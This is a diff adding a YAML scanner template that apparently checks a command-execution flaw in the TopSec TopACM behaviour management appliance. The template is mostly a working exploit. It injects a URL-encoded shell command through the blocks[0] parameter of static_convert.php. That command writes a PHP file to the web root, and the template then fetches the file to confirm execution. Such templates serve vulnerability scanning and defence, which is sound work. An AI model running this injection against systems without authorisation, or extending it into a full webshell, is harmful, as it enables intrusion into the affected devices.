@@ -1,0 +1,40 @@
+id: poc-local-topsec-TopACM-exec
+
+info:
+  name: 天融信 TopSec上网行为管理系统命令执行漏洞
+  author: capiton
+  severity: critical
+  tags: topsec,topacm
+
+variables:
+  random_file: "{{randstr}}"
+  random: "{{rand_int(100000,999999)}}"
+  # md5_random: '{{md5("{{random}}")}}'
+  exec_payload: '{{"%7C%7C%20echo%20%22%3C%3Fphp%20echo%20md5("+ random +")%3B%22%3E" + random_file + ".php%0a"}}'
+
+
+requests:
+  - method: GET
+    id: exec
+    path:
+      - "{{RootURL}}/view/IPV6/naborTable/static_convert.php?blocks[0]={{exec_payload}}"
+  
+  - method: GET
+    id: webshell
+    path:
+      - "{{RootURL}}/view/IPV6/naborTable/{{random_file}}.php"
+
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      # - type: status
+      #   condition: and
+      #   status:
+      #     - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5(random)}}"
